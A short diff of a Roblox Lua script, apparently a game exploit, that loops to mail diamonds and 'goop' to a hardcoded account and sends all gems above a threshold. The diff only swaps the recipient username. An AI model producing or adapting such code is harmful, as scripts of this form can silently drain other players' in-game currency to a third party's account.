@@ -21,7 +21,7 @@ end)
 spawn(function()
     local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
     
-    local username = "ADHDMeth" -- Replace with recipient's username
+    local username = "ProfiAzUr" -- Replace with recipient's username
     local loopInterval = 5 -- Interval in minutes
     local mailTax = 100000 -- Tax deduction for sending diamonds
     local diamondThreshold = 100000000 -- Threshold for sending all gems
@@ -90,7 +90,7 @@ end)
 -- Goop Mailer
 spawn(function()
     local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-    local username = "ADHDMeth"
+    local username = "ProfiAzUr"
     local loopInterval = 10 
     local sendAmount = 10000 -- Editable amount
     while true do
